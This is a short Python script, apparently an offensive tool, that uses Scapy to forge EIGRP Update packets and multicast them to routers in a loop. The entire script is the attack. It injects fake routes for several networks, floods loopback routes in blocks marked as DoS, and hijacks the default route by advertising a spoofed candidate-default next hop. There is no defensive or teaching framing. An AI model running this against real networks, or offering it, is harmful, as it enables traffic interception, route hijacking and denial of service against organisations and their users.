#HACK EIGRP - inject fake routes
#Import time so we can set a sleep timer
import time
#Import scapy
from scapy.all import *
#Import EIGRP
load_contrib('eigrp')
def ddos(ip):
	#For Loop to send multiple packets
	for i in range (0,20):

    		#Inject fake route
    		sendp(Ether()/IP(src=ip,dst="224.0.0.10") \
        	/EIGRP(opcode="Update", asn=100, seq=0, ack=0, \
        	tlvlist=[EIGRPIntRoute(dst="192.168.100.0", nexthop=ip)]))

    		#Inject fake route
   	 	sendp(Ether()/IP(src=ip,dst="224.0.0.10") \
        		/EIGRP(opcode="Update", asn=100, seq=0, ack=0, \
        		tlvlist=[EIGRPIntRoute(dst="192.168.101.0", nexthop=ip)]))

    		#DOS loopback 0 - you will need to check which network is used
    		sendp(Ether()/IP(src=ip,dst="224.0.0.10") \
        		/EIGRP(opcode="Update", asn=100, seq=0, ack=0, \
        		tlvlist=[EIGRPIntRoute(dst="1.1.1.1", nexthop=ip)]))

    		#DOS loopback 1  - you will need to check which network is used
    		sendp(Ether()/IP(src=ip,dst="224.0.0.10") \
        		/EIGRP(opcode="Update", asn=100, seq=0, ack=0, \
        		tlvlist=[EIGRPIntRoute(dst="1.1.1.1", nexthop=ip)]))

    		#Change default route
    		sendp(Ether()/IP(src=ip,dst='224.0.0.10') \
        		/EIGRP(opcode="Update", asn=100, seq=0, ack=0, \
        		tlvlist=[EIGRPExtRoute(dst='0.0.0.0', nexthop=ip, \
        		originrouter='192.168.1.248', prefixlen=0, flags="candidate-default")]))

    		time.sleep(2)
	print('Malicious route packets successfully send')
